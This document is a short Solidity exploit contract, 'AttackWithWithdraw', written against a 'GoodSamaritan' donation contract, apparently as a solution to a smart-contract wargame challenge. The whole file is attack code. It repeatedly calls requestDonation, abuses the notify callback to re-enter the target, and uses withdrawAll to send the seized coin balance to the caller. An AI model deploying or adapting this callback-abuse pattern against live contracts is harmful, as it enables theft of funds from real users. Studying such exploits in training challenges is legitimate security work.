pragma solidity ^0.8.0;
interface IGoodSamaritan {
    function requestDonation() external returns (bool);
    function coin() external view returns (address);
}
interface ICoin {
    function balanceOf(address) external returns (uint);
    function transfer(address dest, uint amount) external returns (bool);
}
contract AttackWithWithdraw {
    address instance;
    ICoin coin;

    constructor(address payable _instance) {
        instance = _instance;
        coin = ICoin(IGoodSamaritan(_instance).coin());
    }

    function attack() external {
        IGoodSamaritan(instance).requestDonation();
    }

    function notify(uint256) external {
        IGoodSamaritan(instance).requestDonation();
    }

    function withdrawAll() external {
        uint balance = coin.balanceOf(address(this));
        if (balance > 0) {
            coin.transfer(msg.sender, balance);
        }
    }
}
